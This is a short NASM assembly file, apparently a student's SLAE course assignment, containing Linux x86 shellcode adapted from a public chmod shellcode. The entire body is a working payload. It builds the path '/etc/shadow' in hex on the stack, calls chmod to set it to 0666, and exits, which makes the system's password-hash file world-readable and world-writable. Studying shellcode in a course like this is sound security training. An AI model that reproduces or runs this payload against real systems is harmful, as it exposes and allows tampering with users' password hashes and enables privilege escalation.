; Filename: SLAEobfuscated.nasm
; Author:  Billy (@_hAxel)
; Website:  https://www.haxel.io
;
; Student ID:  PA-7462
; Purpose: SLAE Assignmnet 6.3 - Original version of CHMOD shellcode, found here: http://shell-storm.org/shellcode/files/shellcode-210.php

global _start			

section .text
_start:

      	xor edx, edx
 
       	push byte 15
       	pop eax
       	push edx
       	push byte 0x77
       	push word 0x6f64
       	push 0x6168732f
       	push 0x6374652f
       	mov ebx, esp
       	push word 0666Q
       	pop ecx
       	int 0x80

       	push byte 1
       	pop eax
	int 0x80
